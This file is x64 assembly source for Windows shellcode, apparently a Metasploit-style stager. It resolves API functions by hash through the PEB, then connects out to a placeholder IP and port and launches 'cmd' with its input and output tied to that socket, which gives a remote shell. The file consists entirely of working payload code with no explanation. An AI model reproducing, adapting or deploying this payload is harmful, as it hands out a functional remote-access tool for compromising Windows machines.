[BITS 64]
  cld
  and rsp, 0xFFFFFFFFFFFFFFF0
  call start
api_call:
  push r9
  push r8
  push rdx
  push rcx
  push rsi
  xor rdx, rdx
  mov rdx, [gs:rdx+96]
  mov rdx, [rdx+24]
  mov rdx, [rdx+32]
next_mod:
  mov rsi, [rdx+80]
  movzx rcx, word [rdx+74]
  xor r9, r9
loop_modname:
  xor rax, rax
  lodsb
  cmp al, 'a'
  jl not_lowercase
  sub al, 0x20
not_lowercase:
  ror r9d, 13
  add r9d, eax
  loop loop_modname
  push rdx
  push r9
  mov rdx, [rdx+32]
  mov eax, dword [rdx+60]
  add rax, rdx
  cmp word [rax+24], 0x020B
  jne get_next_mod1
  mov eax, dword [rax+136]
  test rax, rax
  jz get_next_mod1
  add rax, rdx
  push rax
  mov ecx, dword [rax+24]
  mov r8d, dword [rax+32]
  add r8, rdx
get_next_func:
  jrcxz get_next_mod
  dec rcx
  mov esi, dword [r8+rcx*4]
  add rsi, rdx
  xor r9, r9
loop_funcname:
  xor rax, rax
  lodsb
  ror r9d, 13
  add r9d, eax
  cmp al, ah
  jne loop_funcname
  add r9, [rsp+8]
  cmp r9d, r10d
  jnz get_next_func
  pop rax
  mov r8d, dword [rax+36]
  add r8, rdx
  mov cx, [r8+2*rcx]
  mov r8d, dword [rax+28]
  add r8, rdx
  mov eax, dword [r8+4*rcx]
  add rax, rdx
finish:
  pop r8
  pop r8
  pop rsi
  pop rcx
  pop rdx
  pop r8
  pop r9
  pop r10
  sub rsp, 32
  push r10
  jmp rax
get_next_mod:
  pop rax
get_next_mod1:
  pop r9
  pop rdx
  mov rdx, [rdx]
  jmp next_mod
start:
  pop rbp
reverse_tcp:
  mov r14, 'ws2_32'
  push r14
  mov r14, rsp
  sub rsp, 408+8
  mov r13, rsp
  mov r12, 0xCONNECTBACK_IPCONNECTBACK_PORT0002
  push r12
  mov r12, rsp
  mov rcx, r14
  mov r10d, 0x0726774C
  call rbp
  mov rdx, r13
  push 0x0101
  pop rcx
  mov r10d, 0x006B8029
  call rbp
  push rax
  push rax
  xor r9, r9
  xor r8, r8
  inc rax
  mov rdx, rax
  inc rax
  mov rcx, rax
  mov r10d, 0xE0DF0FEA
  call rbp
  mov rdi, rax
  push byte 16
  pop r8
  mov rdx, r12
  mov rcx, rdi
  mov r10d, 0x6174A599
  call rbp
  add rsp, ( (408+8) + (8*4) + (32*4) )
shell:
  mov r8, 'cmd'
  push r8
  push r8
  mov rdx, rsp
  push rdi
  push rdi
  push rdi
  xor r8, r8
  push byte 13
  pop rcx
push_loop:
  push r8
  loop push_loop
  mov word [rsp+84], 0x0101
  lea rax, [rsp+24]
  mov byte [rax], 104
  mov rsi, rsp
  push rsi
  push rax
  push r8
  push r8
  push r8
  inc r8
  push r8
  dec r8
  mov r9, r8
  mov rcx, r8
  mov r10d, 0x863FCC79
  call rbp
  xor rdx, rdx
  dec rdx
  mov ecx, dword [rsi]
  mov r10d, 0x601D8708
  call rbp
exitfunk:
  mov ebx, 0x0A2A1DE0
  mov r10d, 0x9DBD95A6
  call rbp
  add rsp, 40
  cmp al, byte 6
  jl short goodbye
  cmp bl, 0xE0
  jne short goodbye
  mov ebx, 0x6F721347
goodbye:
  push byte 0
  pop rcx
  mov r10d, ebx
  call rbp